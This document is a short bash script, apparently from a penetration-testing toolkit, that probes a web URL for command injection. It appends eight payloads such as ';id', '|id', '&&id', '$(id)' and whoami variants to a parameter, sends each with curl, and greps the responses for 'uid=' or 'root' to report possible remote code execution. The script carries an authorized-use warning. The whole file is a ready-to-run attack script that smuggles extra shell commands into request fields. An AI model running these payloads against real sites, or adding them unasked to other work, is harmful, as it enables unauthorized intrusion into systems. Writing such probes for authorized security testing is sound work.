#!/bin/bash
# rce_test.sh - Remote Code Execution testing
# Usage: ./rce_test.sh URL

source "$(dirname "$0")/config.sh" 2>/dev/null || true

if [ -z "$1" ]; then
    echo "Usage: $0 URL"
    echo "Example: $0 'http://target.com/cmd.php?cmd='"
    exit 1
fi

URL="$1"

echo "[*] RCE testing on $URL"
echo "[!] WARNING: Only use on authorized targets!"

PAYLOADS=(
    ";id"
    "|id"
    "&&id"
    "\$(id)"
    "\`id\`"
    ";whoami"
    "|whoami"
    "&&whoami"
)

for payload in "${PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    FULL_URL="${URL}${ENCODED}"
    
    RESPONSE=$(curl -s "$FULL_URL")
    
    if echo "$RESPONSE" | grep -qE "uid=|gid=|www-data|root|nobody"; then
        echo "[+] POSSIBLE RCE: $payload"
        echo "[+] Response:"
        echo "$RESPONSE" | head -5
    else
        echo "[-] Blocked: $payload"
    fi
done
